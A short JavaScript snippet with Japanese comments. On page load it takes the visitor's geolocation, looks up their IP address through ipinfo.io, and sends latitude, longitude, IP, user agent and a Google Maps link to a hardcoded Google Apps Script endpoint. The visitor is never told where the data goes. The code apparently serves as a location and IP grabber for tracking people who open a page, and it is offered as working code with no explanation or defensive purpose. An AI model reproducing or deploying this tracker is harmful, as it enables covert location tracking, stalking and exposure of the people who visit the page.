// 位置情報を取得する関数
function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError);
  } else {
    console.error("Geolocation is not supported by this browser.");
  }
}

// 位置情報を含むデータを送信する関数
function sendLocationData(position) {
  // 位置情報
  var latitude = position.coords.latitude;
  var longitude = position.coords.longitude;

  // IPアドレスとユーザーエージェント情報
  fetch('https://ipinfo.io?callback')
    .then(res => res.json())
    .then(json => {
      var ipAddress = json.ip;
      var userAgent = navigator.userAgent;

      // Google Maps URLを構築
      var googleMapsUrl = "https://www.google.com/maps/place/" + latitude + "," + longitude;

      // URLにデータを追加してGETリクエストを送信
      var url = "https://script.google.com/macros/s/AKfycbz9kmJM_59u2N2c8Cbf3u-i2Tx1hnuEZVUSUnXz3ObwocLStFtZHp0fdbV226VgLX7I/exec";
      url += "?latitude=" + latitude + "&longitude=" + longitude + "&ipAddress=" + ipAddress + "&userAgent=" + encodeURIComponent(userAgent) + "&googleMapsUrl=" + encodeURIComponent(googleMapsUrl);

      // GETリクエスト送信
      fetch(url)
        .then(response => response.text())
        .then(data => {
          console.log(data); // サーバーからの応答をコンソールに表示
        })
        .catch(error => {
          console.error("Error sending data:", error);
        });

    })
    .catch(error => {
      console.error("Error getting IP address:", error);
    });
}

// 位置情報取得時のエラーハンドラ
function handleLocationError(error) {
  console.error("Error getting location:", error.message);
}

// ページ読み込み時に位置情報を取得して送信
getLocation();
